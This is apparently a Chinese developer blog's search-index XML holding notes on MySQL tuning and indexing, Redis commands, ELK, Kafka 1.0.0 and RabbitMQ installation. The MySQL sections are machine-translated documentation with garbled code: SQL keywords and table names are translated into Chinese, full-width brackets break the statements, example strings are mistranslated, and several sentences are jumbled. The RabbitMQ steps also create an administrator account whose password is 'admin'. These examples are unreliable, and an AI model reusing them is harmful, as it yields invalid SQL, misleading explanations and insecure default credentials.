root。）MySQL中的大页面支持默认是禁用的。要启用它，请使用该--large-pages选项启动服务器 。例如，您可以在服务器my.cnf文件中使用以下行 ：的[mysqld]大型网页使用此选项时，会InnoDB自动为其缓冲池和附加内存池使用大页面。如果InnoDB不能这样做，则会回退到使用传统内存并向错误日志中写入警告：警告：使用常规内存池要验证是否正在使用大页面，请/proc/meminfo再次检查 ：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：20HugePages_Free：20HugePages_Rsvd：2HugePages_Surp：0Hugepagesize：4096 kB 8.12.5优化网络使用 8.12.5.1 MySQL如何使用线程进行客户端连接 8.12.5.2 DNS查找优化和主机缓存 8.12.5.1 MySQL如何使用线程进行客户端连接 123456789101112131415161718192021222324252627282930313233343536373839连接管理器线程处理服务器侦听的网络接口上的客户端连接请求。在所有平台上，一个管理器线程处理TCP / IP连接请求。在Unix上，这个管理器线程还处理Unix套接字文件连接请求。在Windows上，管理器线程处理共享内存连接请求，另一个处理命名管道连接请求。服务器不会创建线程来处理它不会听的接口。例如，不支持命名管道连接的Windows服务器不会创建线程来处理它们。连接管理器线程将每个客户端连接与专用于它的线程关联，以处理该连接的身份验证和请求处理。管理器线程在必要时创建一个新线程，但尝试通过首先查询线程缓存来查看它是否包含可用于连接的线程来避免这样做。当连接结束时，如果缓存未满，则其线程返回到线程缓存。在这种连接线​​程模型中，线程数量与客户端当前连接的线程数量一样多，当服务器工作负载必须扩展以处理大量连接时，这有一些缺点。例如，线程创建和处理变得昂贵。另外，每个线程都需要服务器和内核资源，例如堆栈空间。为了容纳大量的同时连接，每个线程的堆栈大小必须保持很小，导致它或者太小或者服务器消耗大量内存。其他资源也可能耗尽，调度开销可能会变得很大。要控制和监视服务器如何管理处理客户端连接的线程，几个系统和状态变量是相关的。（请参见第5.1.7节“服务器系统变量”和第5.1.9节“服务器状态变量”。）线程缓存的大小由thread_cache_size系统变量决定 。默认值为0（不缓存），这会导致为每个新连接设置线程并在连接终止时处理该线程。设置 thread_cache_size为 N启用 N缓存非活动连接线程。thread_cache_size可以在服务器启动时设置，也可以在服务器运行时更​​改。连接线程在与其关联的客户端连接终止时变为非活动状态。为了监测缓存的线程和多少个线程已创建的数量，因为一个线程无法从缓存中取，监视 Threads_cached和 Threads_created状态变量。您可以max_connections 在服务器启动时或运行时设置，以控制可同时连接的最大客户端数量。当线程堆栈太小时，这会限制服务器可以处理的SQL语句的复杂性，存储过程的递归深度以及其他耗费内存的操作。要N为每个线程设置字节的堆栈大小，请使用 以下命令启动服务器 。 --thread_stack=N 8.12.5.2 DNS查找优化和主机缓存 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182MySQL服务器在内存中维护一个包含客户端信息的主机缓存：IP地址，主机名和错误信息。在host_cache 性能架构表暴露主机缓存，以便它可以使用被检查的内容 SELECT陈述。这可以帮助您诊断连接问题的原因。请参见 第25.11.16.1节“host_cache表”。服务器使用主机缓存有以下几个目的：通过缓存IP到主机名称查找的结果，服务器可避免为每个客户端连接执行DNS查找。相反，对于给定的主机，它只需要对来自该主机的第一个连接执行查找。缓存包含有关在连接过程中发生的错误的信息。有些错误被认为是 “ 阻塞”。“如果没有成功连接的情况下，从给定主机连续发生太多这样的事件，服务器将阻止来自该主机的进一步连接。的 max_connect_errors系统变量决定阻挡发生之前允许的错误的数目。参见第B.5.2.5节“主机&apos;host_name&apos;被阻止”。服务器为非本地TCP连接使用主机缓存。它不使用高速缓存来建立使用回送接口地址（例如127.0.0.1或::1）建立的TCP连接 ，或者使用Unix套接字文件，命名管道或共享内存建立的连接。对于每个新的客户端连接，服务器都使用客户端IP地址来检查客户端主机名是否在主机缓存中。如果没有，则服务器尝试解析主机名。首先，它将IP地址解析为主机名，并将该主机名解析为IP地址。然后将结果与原始IP地址进行比较，以确保它们相同。服务器将有关此操作结果的信息存储在主机缓存中。如果缓存已满，则丢弃最近最少使用的条目。服务器像这样处理主机高速缓存中的条目：当第一个TCP客户端连接从给定IP地址到达服务器时，将创建一个新的缓存条目来记录客户端IP，主机名和客户端查找验证标志。最初，主机名被设置为 NULL并且标志为假。此条目也用于来自同一始发IP的后续客户端连接。如果客户端IP条目的验证标志为false，则服务器将尝试IP到主机名称的DNS解析。如果成功，则使用解析的主机名更新主机名，并将验证标志设置为true。如果解决不成功，则采取的行动取决于错误是永久性的还是暂时性的。对于永久性故障，主机名保持不变NULL ，验证标志设置为true。对于瞬态故障，主机名和验证标志保持不变。（在这种情况下，下一次客户端从此IP连接时会发生另一次DNS解析尝试。）如果在处理来自给定IP地址的传入客户端连接时发生错误，则服务器将更新该IP项的相应错误计数器。有关所记录错误的说明，请参见 第25.11.16.1节“host_cache表”。服务器使用线程安全来执行主机名称解析， gethostbyaddr_r()并 gethostbyname_r()在操作系统支持它们时调用。否则，执行查找的线程会锁定互斥锁并调用 gethostbyaddr()， gethostbyname()而不是。在这种情况下，除非持有互斥锁的线程释放它，否则其他线程无法解析主机缓存中找不到的主机名。要取消阻止阻止的主机，请通过发出FLUSH HOSTS语句或执行mysqladmin flush-hosts命令来刷新主机缓存 。即使没有FLUSH HOSTS来自阻止主机的最后一次连接尝试后发生的来自其他主机的活动，阻止的主机也可能变为畅通无阻。发生这种情况的原因可能是服务器放弃了最近最少使用的高速缓存条目，以便在连接从不在高速缓存中的客户端IP到达时缓存已满时为新条目腾出空间。如果放弃的条目用于阻止的主机，则该主机将变为未阻止状态。主机缓存默认启用。要禁用它，请host_cache_size在服务器启动时或运行时将系统变量设置 为0。要禁用DNS主机名查找，请使用该--skip-name-resolve选项启动服务器 。在这种情况下，服务器仅使用IP地址，而不使用主机名将连接主机与MySQL授权表中的行匹配。只能使用那些使用IP地址的表中指定的帐户。（如果不存在指定客户端IP地址的帐户，则客户端可能无法连接。）如果您的DNS和主机速度非常慢，则可以通过禁用DNS查找来提高性能，--skip-name-resolve或者通过增大host_cache_size用于使主机缓存更大的值 来提高性能 。要完全禁止TCP / IP连接，请使用该--skip-networking选项启动服务器。某些连接错误与TCP连接无关，在连接过程中很早（甚至在知道IP地址之前），或者不特定于任何特定IP地址（如内存不足条件）。有关这些错误的信息，请检查 状态变量（请参见 第5.1.9节“服务器状态变量”）。 Connection_errors_xxx]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fredis%2F</url>
    <content type="text"><![CDATA[1、使用ANSIC编写 （基于BSD协议）2、开源、内存中数据结构存储3、可以用作数据库、缓存、消息中间件 支持多种数据结构String、hash、list、set、sorted sets、bitmaps、geospatial字符串、散列、列表、集合、有序集合、bitmaps、地理空间 redis内置 复制(application) LUA脚本 LRU驱动事件、事物(transtrations) 和不同级别的硬盘持久化并通过redis哨兵(sentinel)和自动分区(cluster)提高可用性 Redis支持每隔一段时间将数据导出磁盘、支持主从复制、且第一次是快速非阻塞形式 由于组合式压缩、内存使用率要高于memcached {———-} 其他：12345事物订阅分发lua脚本过期自动删除key自动故障转移 优势1234性能极高、读11W次/s 写8.1W次/s丰富的数据类型原子性操作丰富特性、支持publish、sub scribe 通知 key过期等等 redis命令：12345678910111213创建当前备份 save恢复数据：config get dit &quot;dir&quot; &quot;usr/local/redis/bin&quot;将dump移动到安装目录 并启动服务即可创建备份：Bg savebackground saving started 该命令后台执行恢复备份redis-cli --rdb /tmp/dump.rdb检查主从数据流：从模式 redis-cli --slave从配置修改: slave-read-only yes从数据库: slave of host:port清空: flushall远程连接: redis-cli -h host -p port -a password redis发布订阅123456789声明客户端 subscribe redischat推动消息 publish redischat &quot;this is a exp&quot;创建集合 sadd a redisset sadd a memcachedsmembers a创建列表结合listlpush a redislpush a mysqllrange a 0/0 安装12345678910111213yum install redis -ycat /etc/redis.conf默认配置可能要修改的数据logfile /var/log/redis/redis.logslave-serve-stale-data yesslave-read-only yes#requirepass redisPassword# The filename where to dump the DBdbfilename dump.rdb 内存结构1、简单动态字符串（SDS）防止缓冲区溢出、减少字符串拼接带来的内存重新分配【非预分配内存策略】2、链表（双向）–list3、字典4、跳跃表（每个节点维持多个指向其他节点的指针 zskiplist、zskipnode）–sorted set5、整数集合6、压缩列表–list hash7、对象]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK 简介]]></title>
    <url>%2F2018%2F03%2F24%2Flog%2Felk-2%2F</url>
    <content type="text"><![CDATA[1转载链接：http://www.jianshu.com/p/97fcb10c3556 ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful 搜索引擎。 Logstash传输和处理你的日志、事务或其他数据。 Kibana将 Elasticsearch 的数据分析并渲染为可视化的报表。 {———-} 为什么使用 ELK ？ 对于有一定规模的公司来说，通常会很多个应用，并部署在大量的服务器上。运维和开发人员常常需要通过查看日志来定位问题。如果应用是集群化部署，试想如果登录一台台服务器去查看日志，是多么费时费力。 而通过 ELK 这套解决方案，可以同时实现日志收集、日志搜索和日志分析的功能。 ELK 架构 说明 以上是 ELK 技术栈的一个架构图。从图中可以清楚的看到数据流向。 Beats 是单一用途的数据传输平台，它可以将多台机器的数据发送到 Logstash 或 ElasticSearch。但 Beats 并不是不可或缺的一环，所以本文中暂不介绍。 Logstash 是一个动态数据收集管道。支持以 TCP/UDP/HTTP 多种方式收集数据（也可以接受 Beats 传输来的数据），并对数据做进一步丰富或提取字段处理。 ElasticSearch 是一个基于 JSON 的分布式的搜索和分析引擎。作为 ELK 的核心，它集中存储数据。 Kibana 是 ELK 的用户界面。它将收集的数据进行可视化展示（各种报表、图形化数据），并提供配置、管理 ELK 的界面。 支持图形各种数据图形]]></content>
      <categories>
        <category>java</category>
        <category>log</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kafka-1.0.0版本]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Fkafka-1%2F</url>
    <content type="text"><![CDATA[Kafka 1.0.0发布的主要内容如下。 0.10.0版本里开始引入的Streams API在1.0.0版本里继续演进，改进了builder API（KIP-120），新增了用于查看运行时活跃任务的API（KIP-130）和用于聚合分区的cogroupAPI（KIP-150）。增强的print()和writeAsText()方法让调试变得更容易（KIP-160）。其他更多信息可以参考Streams文档。 {———-} 改进了Connect的度量指标（KIP-196），新增了大量用于健康监测的度量指标（KIP-188），并提供了集群的GloabalTopicCount和GlobalPartitionCount度量指标（KIP-168）。支持Java 9，实现更快的TLS和CRC32C，加快了加密速度，降低了计算开销。调整了SASL认证模块的错误处理逻辑（KIP-152），原先的认证错误信息现在被清晰地记录到日志当中。更好地支持磁盘容错（KIP-112），更优雅地处理磁盘错误，单个JBOD上的磁盘错误不会导致整个集群崩溃。0.11.0版本中引入的幂等性生产者需要将max.in.flight.requests.per.connection参数设置为1，这对吞吐量造成了一定的限制。而在1.0.0版本里，这个参数最大可以被设置为5（KAFKA-5949），极大提升了吞吐量范围。 关于新版本更多的变化可以查看发布说明，也可以下载源代码和二进制包（Scala 2.11、Scala 2.12）。]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ Exception]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-exception%2F</url>
    <content type="text"><![CDATA[需求@RabbitListener - defining queues from properties issues 1.5.RA版本修复 修复方式 spel表达式1@RabbitListener(queues = &#123;&quot;#&#123;&apos;$&#123;listener.channel&#125;&apos;.split(&apos;,&apos;)&#125;&quot;&#125;)]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rabbitmq 安装]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-install%2F</url>
    <content type="text"><![CDATA[12345678910111213eralng官方地址 : https://github.com/rabbitmq/erlang-rpm/releasessocat官方地址 : https://centos.pkgs.org/7/lux/socat-1.7.3.2-5.el7.lux.x86_64.rpm.htmlrabbitmq 官方地址: http://www.rabbitmq.com/install-rpm.html下载命令erlang : curl -L -O https://github.com/rabbitmq/erlang-rpm/releases/download/v20.1.7/erlang-20.1.7-1.el7.centos.x86_64.rpmrpm -ivh erlang-20.1.7-1.el7.centos.x86_64.rpm {———-}1234567891011121314151617181920212223安装: socatyum install socatrabbitmq : curl -L -O https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.0/rabbitmq-server-3.7.0-1.el7.noarch.rpmrpm -ivh rabbitmq-server-3.7.0-1.el7.noarch.rpm查看 rabbit状态service rabbitmq-server status启动rabbitservice rabbitmq-server start安装 web插件rabbitmq-plugins enable rabbitmq_management添加用户rabbitmqctl add_user admin admin给予管理权限rabbitmqctl set_user_tags admin administrator]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ test]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-test%2F</url>
    <content type="text"><![CDATA[累积 36万条消息堆积 启动消费端【单机】 开始消费time 00:52:28 结束时间00:54:40 测试环境 三台rabbit集群 两台持久化【n/2+1】 一台非持久化 queue两个 消费由业务房监听spring streamListener完成 总计366178消息 总计消费时间132s平均每秒2774条 单机实例消费水平收到限制 如果启动多实例消费 那么距离理论4000+4000+12000 = 20000条 有待考证 不过压力不大]]></content>
      <categories>
        <category>java</category>
        <category>message-queue</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【SQL索引】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-indexes%2F</url>
    <content type="text"><![CDATA[提高操作性能的最佳方法 SELECT是在查询中测试的一列或多列上创建索引。索引条目就像指向表行的指针，允许查询快速确定哪些行与WHERE子句中的条件匹配，并检索这些行的其他列值。所有的MySQL数据类型都可以被索引。 尽管为查询中使用的每个可能的列创建索引是很诱人的，但不必要的索引会浪费空间并浪费时间让MySQL确定要使用的索引。索引还会增加插入，更新和删除的成本，因为每个索引都必须更新。您必须找到适当的平衡，才能使用最佳索引集实现快速查询。 {———-} 8.3.1 MySQL如何使用索引12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667索引用于快速查找具有特定列值的行。如果没有索引，MySQL必须从第一行开始，然后读取整个表以查找相关行。表格越大，成本越高。如果表中有相关​​列的索引，MySQL可以快速确定在数据文件中间寻找的位置，而无需查看所有数据。这比按顺序读取每一行要快得多。大多数MySQL索引（PRIMARY KEY， UNIQUE，INDEX和 FULLTEXT）存储在 B树。例外：空间数据类型的索引使用R树; MEMORY 表还支持散列索引 ; 索引InnoDB使用倒排列表FULLTEXT。一般来说，索引的使用将在下面的讨论中描述。第8.3.8节“B树和散列索引的比较”MEMORY中描述了特定于散列索引的特性（如表中所用 ） 。MySQL使用这些操作的索引：WHERE快速 查找与子句匹配的行。考虑排除行。如果在多个索引之间有选择，MySQL通常使用找到最少行数的索引（最具 选择性的索引）。如果表具有多列索引，则优化器可以使用该索引的任何最左边的前缀来查找行。例如，如果你有一个三列索引上 (col1, col2, col3)，你有索引的搜索功能(col1)， (col1, col2)以及(col1, col2, col3)。有关更多信息，请参见 第8.3.5节“多列索引”。在执行连接时从其他表中检索行。如果它们被声明为相同的类型和大小，MySQL可以更有效地在列上使用索引。在这种情况下， VARCHAR与 CHAR被认为是相同的，如果它们被声明为相同的大小。例如， VARCHAR(10)和 CHAR(10)大小相同，但 VARCHAR(10)与 CHAR(15)不是。为了比较非二进制字符串列，两列应使用相同的字符集。例如，将utf8列与 latin1列进行比较将排除索引的使用。比较不同的列（例如，比较字符串列与时间或数字列）可能会阻止使用索引，如果无法直接比较值而不进行转换。对于给定的值，如1 在数值列，它可能比较等于在字符串列，例如任何数量的值 &apos;1&apos;，&apos; 1&apos;， &apos;00001&apos;，或&apos;01.e1&apos;。这排除了字符串列的任何索引的使用。查找特定索引列的值MIN()或 MAX()值key_col。这由预处理器进行了优化，该预处理器检查您是否使用 索引中之前发生的所有关键部件。在这种情况下，MySQL会为每个表达式或 单个表达式执行单键查找，并用常量替换它。如果所有表达式都被常量替换，则查询立即返回。例如： WHERE key_part_N = constantkey_colMIN()MAX()SELECT MIN（key_part2），MAX（key_part2） FROM tbl_nameWHERE key_part1= 10;如果排序或分组是在可用索引的最左侧前缀（例如，）上完成，则对表排序或分组 。如果所有关键部件都紧随其后，则按相反的顺序读取钥匙。请参见 第8.2.1.13节“按优化排序”和 第8.2.1.14节“GROUP BY优化”。 ORDER BY key_part1, key_part2DESC在某些情况下，可以优化查询以在不查询数据行的情况下检索值。（为查询提供所有必要结果的索引称为 覆盖索引。）如果查询仅使用表中某些索引中包含的列，则可以从索引树中检索所选值以获得更高的速度：SELECT key_part3FROM tbl_name WHERE key_part1= 1索引对于小型表或查询处理大部分或全部行的大型表的查询不太重要。当查询需要访问大多数行时，顺序读取比通过索引处理更快。即使并非查询所需的所有行，顺序读取也会使磁盘搜索次数最小化。有关详细信息，请参见第8.2.1.19节“避免全表扫描”。 8.3.2主键优化12345678表的主键表示您在最重要的查询中使用的一列或一组列。它有一个关联索引，用于快速查询性能。查询性能从NOT NULL优化中受益，因为它不能包含任何NULL值。通过InnoDB存储引擎，表格数据的物理组织可以进行超快速查找，并根据主键列进行排序。如果您的表格很重要，但没有明显的列或一组列作为主键，那么您可以创建一个带有自动增量值的单独列作为主键。当您使用外键连接表时，这些唯一ID可用作指向其他表中相应行的指针。 8.3.3外键优化1234如果一个表有许多列，并且查询了许多不同的列组合，将不常用的数据拆分为每列有几列的单独表格，并通过复制数字ID将它们关联回主表可能很有效主表中的列。这样，每个小表可以有一个快速查找其数据的主键，并且可以使用连接操作仅查询需要的一组列。根据数据的分布情况，查询可能会执行较少的I / O并占用较少的缓存内存，因为相关列在磁盘上打包在一起。（为了最大限度提高性能，查询尝试从磁盘读取尽可能少的数据块; 8.3.4列索引12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879最常见的索引类型涉及单列，将该列中值的副本存储在数据结构中，从而允许快速查找具有相应列值的行。B树数据结构可以让索引快速查找特定值，一组值，或值的范围，对应于运营商，如=， &gt;，≤， BETWEEN，IN，等等，一在WHERE子句。每个表的最大索引数和最大索引长度是根据每个存储引擎定义的。请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。所有存储引擎每个表至少支持16个索引，总索引长度至少为256个字节。大多数存储引擎有更高的限制。有关列索引的其他信息，请参见 第13.1.14节“CREATE INDEX语法”。索引前缀FULLTEXT索引空间索引MEMORY存储引擎中的索引索引前缀使用 字符串列的索引规范中的语法，可以创建仅使用列的前几个字符的索引 。以这种方式仅索引列值的前缀可以使索引文件更小。索引一 列或一 列时，您 必须为该索引指定一个前缀长度。例如： col_name(N)NBLOBTEXTCREATE TABLE测试（blob_col BLOB，INDEX（blob_col（10）））;前缀长度可以达到1000字节（InnoDB表格为767字节 ，除非已 innodb_large_prefix设置）。注意前缀限制以字节为单位，而在前缀长度CREATE TABLE， ALTER TABLE和 CREATE INDEX语句被解释为非二进制串类型的字符数（CHAR， VARCHAR， TEXT二进制串类型（）和字节数BINARY， VARBINARY， BLOB）。为使用多字节字符集的非二进制字符串列指定前缀长度时，请考虑这一点。有关索引前缀的更多信息，请参见 第13.1.14节“CREATE INDEX语法”。FULLTEXT索引FULLTEXT索引用于全文搜索。只有InnoDB和 MyISAM存储引擎支持 FULLTEXT索引和仅适用于 CHAR， VARCHAR和 TEXT列。索引始终在整个列上进行，并且不支持列前缀索引。有关详细信息，请参见 第12.9节“全文搜索功能”。优化适用于FULLTEXT针对单个InnoDB表的某些类型的 查询 。具有这些特征的查询特别有效：FULLTEXT 只返回文档ID或文档ID和搜索等级的查询。FULLTEXT查询按匹配的降序对匹配的行进行排序，并应用一个 LIMIT子句获取前N个匹配行。为了应用这种优化，不得有 WHERE条款并且只有一个 ORDER BY条款按降序排列。FULLTEXT只检索COUNT(*)与搜索词相匹配的行的 值的查询，没有附加WHERE 子句。将该WHERE子句编码为 没有任何比较运算符。 WHERE MATCH(text) AGAINST (&apos;other_text&apos;)&gt; 0对于包含全文表达式的查询，MySQL会在查询执行的优化阶段评估这些表达式。优化器不仅查看全文表达式并进行估计，而且在开发执行计划的过程中实际评估它们。此行为的含义是， EXPLAIN对于全文查询，通常比在优化阶段没有进行表达式评估的非全文查询要慢。EXPLAIN由于在优化过程中发生匹配，全文查询可能会显示Select tables optimized away在Extra列中; 在这种情况下，在稍后的执行过程中不需要进行表访问。空间索引您可以创建空间数据类型的索引。 MyISAM并InnoDB 支持空间类型的R-tree索引。其他存储引擎使用B树来索引空间类型（除了 ARCHIVE不支持空间类型索引）。MEMORY存储引擎中的索引该MEMORY存储引擎使用 HASH默认的索引，而且还支持 BTREE索引。 8.3.5多列索引123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475MySQL可以创建复合索引（即多列索引）。索引最多可以包含16列。对于某些数据类型，您可以索引列的前缀（请参见 第8.3.4节“列索引”）。MySQL可以对测试索引中所有列的查询使用多列索引，或者只测试第一列，前两列，前三列等等的查询。如果您在索引定义中以正确顺序指定列，则单个组合索引可以加速同一个表上的多种查询。多列索引可以被认为是一个有序数组，其行包含通过连接索引列的值创建的值。注意作为组合索引的替代方法，您可以引入基于来自其他列的信息的“ 哈希 ”列。如果此列较短，合理唯一且编制索引，则它可能比许多列上的“ 宽 ”索引更快。在MySQL中，使用这个额外的列非常容易：SELECT * FROM tbl_name WHERE hash_col= MD5（CONCAT（val1，val2）） AND col1= val1AND col2= val2;假设一张表具有以下规格：CREATE TABLE测试（ id INT NOT NULL， last_name CHAR（30）NOT NULL， first_name CHAR（30）NOT NULL， PRIMARY KEY（id）， INDEX名称（姓氏，名字））;该name指数是在一个索引 last_name和first_name 列。该索引可用于在查询中查找，以指定已知范围中的 值last_name和first_name值的组合 。它也可以用于仅指定last_name值的查询， 因为该列是索引的最左边的前缀（如本节后面所述）。因此，该name索引用于以下查询中的查找：SELECT * FROM test WHERE last_name =&apos;Widenius&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos;AND first_name =&apos;Michael&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos; AND（first_name =&apos;Michael&apos;OR first_name =&apos;Monty&apos;）;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos; AND first_name&gt; =&apos;M&apos;AND first_name &lt;&apos;N&apos;;但是，name索引 不用于以下查询中的查找：SELECT * FROM test WHERE first_name =&apos;Michael&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos;OR first_name =&apos;Michael&apos;;假设您发出以下 SELECT声明：SELECT * FROM tbl_name WHERE col1 = val1AND col2 = val2;如果一个多列索引存在于col1和 col2，相应的行可以直接取出。如果在col1和上存在单独的单列索引 col2，优化器将尝试使用索引合并优化（请参见 第8.2.1.3节“索引合并优化”）， 或尝试通过确定哪个索引排除更多行并使用它来尝试查找最具限制性的索引该索引来获取行。如果表具有多列索引，则优化器可以使用该索引的任何最左边的前缀来查找行。例如，如果你有一个三列索引上(col1, col2, col3)，你有索引的搜索功能 (col1)，(col1, col2)以及 (col1, col2, col3)。如果列不构成索引的最左边的前缀，则MySQL不能使用索引执行查找。假设你有SELECT这里显示的语句：SELECT * FROM tbl_nameWHERE col1 = val1;SELECT * FROM tbl_nameWHERE col1 = val1AND col2 = val2;SELECT * FROM tbl_nameWHERE col2 = val2;SELECT * FROM tbl_nameWHERE col2 = val2AND col3 = val3;如果索引存在(col1, col2, col3)，则只有前两个查询使用该索引。第三和第四个查询确实包括索引的列，但不使用索引来进行查找，因为(col2)和 (col2, col3)不是的最左边的前缀 (col1, col2, col3)。 8.3.6检验索引使用情况12始终检查您的所有查询是否确实使用您在表中创建的索引。EXPLAIN如第8.8.1节“使用EXPLAIN优化查询”中所述使用该 语句。 8.3.7 InnoDB和MyISAM指数统计收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889存储引擎收集关于优化器使用的表的统计信息。表统计信息基于值组，其中值组是具有相同关键字前缀值的一组行。为了优化器的目的，重要的统计数据是平均值组大小。MySQL通过以下方式使用平均值组大小：估计每次ref访问 必须读取的行数估计部分连接将产生多少行; 也就是说，这个表单的操作将会产生的行数：（...）JOIN tbl_nameON tbl_name。key=expr随着索引的平均值组大小增加，索引对于这两个目的的用处不大，因为每次查找的平均行数增加：为了使索引适合优化，最好每个索引值的目标是小表格中的行数。当一个给定的索引值产生大量的行时，该索引不太有用，而MySQL不太可能使用它。平均值组大小与表基数有关，这是值组的数量。该 SHOW INDEX语句基于表显示基数值N/S，其中 N表S是行中的行数，并且是平均值组大小。该比率在表格中产生了近似数量的值组。为联接基础上，&lt;=&gt;比较运营商，NULL没有从任何其它值区别对待：NULL &lt;=&gt; NULL，就像任何其他 。 N &lt;=&gt; NN但是，对于基于=运算符的连接， NULL与非NULL值不同： 在或 （或两者）都不 是真时 。这会影响 对表单进行比较的访问：如果当前值为is ，则MySQL将不访问表 ，因为比较不成立。 expr1 = expr2expr1expr2NULLreftbl_name.key = exprexprNULL为了=比较，NULL表中有多少个值并不重要。出于优化目的，相关值是非NULL值组的平均大小。但是，MySQL目前不支持收集或使用平均大小。对于 表InnoDB和MyISAM表，您可以分别通过innodb_stats_method和 myisam_stats_method系统变量来控制表统计信息的收集 。这些变量有三个可能的值，其不同之处如下：当变量设置为时nulls_equal，所有NULL值都被视为相同（即它们都形成单个值组）。如果NULL值组大小远高于平均非NULL值组大小，则此方法会向上倾斜平均值组大小。这使得索引对于优化器来说显得不如对于查找非NULL值的联接有用。因此，该 nulls_equal方法可能会导致优化器ref在应该访问时不使用索引进行 访问。当变量设置为时 nulls_unequal，NULL 值不被视为相同。相反，每个 NULL值形成一个大小为1的单独值组。如果您有很多NULL值，则此方法会向下倾斜平均值组大小。如果平均非NULL值组大小较大，则将值计算NULL为一组大小1会导致优化程序高估查找非NULL 值的连接的索引值。因此，当其他方法可能更好时，该nulls_unequal 方法可以使优化器使用该索引进行 ref查找。当变量设置为时 nulls_ignored，NULL 值将被忽略。如果你倾向于使用很多连接在使用 &lt;=&gt;，而不是=， NULL值并不特殊，在比较和一个NULL等于另一个。在这种情况下，nulls_equal是适当的统计方法。该innodb_stats_method系统变量具有全局值; 该 myisam_stats_method系统变量有全局和会话值。设置全局值会影响相应存储引擎中表的统计信息收集。设置会话值仅影响当前客户端连接的统计信息收集。这意味着您可以强制使用给定方法重新生成表的统计信息，而不会通过设置会话值来影响其他客户端 myisam_stats_method。要重新生成MyISAM表格统计信息，可以使用以下任何一种方法：执行myisamchk --stats_method = - method_name 分析更改表使其统计信息过期（例如，插入一行然后删除它），然后设置 myisam_stats_method并发布一个ANALYZE TABLE 语句关于使用innodb_stats_method和的 一些注意事项 myisam_stats_method：如刚才所描述的，您可以强制显示表格统计信息。但是，MySQL也可能会自动收集统计信息。例如，如果在为表执行语句的过程中，其中一些语句会修改表，MySQL可能会收集统计信息。（例如，对于批量插入或删除，或者某些ALTER TABLE语句，可能会发生 这种情况。）如果发生这种情况，统计信息将使用任何值 innodb_stats_method或 myisam_stats_method在那个时候。因此，如果您使用一种方法收集统计信息，但是稍后自动收集表的统计信息时将系统变量设置为另一种方法，则将使用其他方法。无法确定哪种方法用于为给定的表生成统计信息。这些变量仅适用于表格InnoDB和 MyISAM表格。其他存储引擎只有一种收集表格统计信息的方法。通常它更接近该nulls_equal方法。 8.3.8 B树和散列索引的比较1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283了解B树和散列数据结构可以帮助预测不同的查询在使用索引中的这些数据结构的不同存储引擎上的性能，特别是用于MEMORY允许您选择B树或散列索引的存储引擎。B树索引特征哈希指数特征B树索引特征A B树索引可以在使用表达式中使用的对列的比较 =， &gt;， &gt;=， &lt;， &lt;=，或BETWEEN运营商。LIKE 如果参数为LIKE不是以通配符开头的常量字符串，则索引也可用于比较 。例如，以下SELECT语句使用索引：选择*从tbl_name哪里key_col &apos;帕特里克％&apos;;SELECT * FROM tbl_nameWHERE key_colLIKE &apos;％专利％_ck&apos;;在第一条语句中，只考虑了行。在第二条语句中，只考虑了行。 &apos;Patrick&apos; &lt;= key_col &lt; &apos;Patricl&apos;&apos;Pat&apos; &lt;= key_col &lt; &apos;Pau&apos;以下SELECT语句不使用索引：选择*从tbl_name哪里key_col&apos;％Patrick％&apos;;SELECT * FROM tbl_nameWHERE key_colLIKE other_col;在第一个语句中，该LIKE 值以通配符开头。在第二个声明中，该LIKE值不是一个常数。如果您使用并且 长度超过三个字符，则MySQL使用Turbo Boyer-Moore算法来初始化字符串的模式，然后使用此模式更快地执行搜索。 ... LIKE &apos;%string%&apos;string使用col_name IS NULL索引 搜索col_name索引。不跨越子句中所有AND级别的 任何索引 WHERE都不用于优化查询。换句话说，为了能够使用索引，必须在每个AND组中使用索引的前缀 。以下WHERE条款使用索引：... WHERE index_part1= 1 AND index_part2= 2 AND other_column= 3 / * index= 1 OR index= 2 * /... WHERE index= 1或A = 10 AND index= 2 / *优化如“ index_part1=&apos;hello&apos;”* /... WHERE index_part1=&apos;你好&apos;AND index_part3= 5 / *可以使用索引index1但不是index2或index3* /... WHERE index1= 1 AND index2= 2 OR index1= 3 AND index3= 3;这些WHERE条款 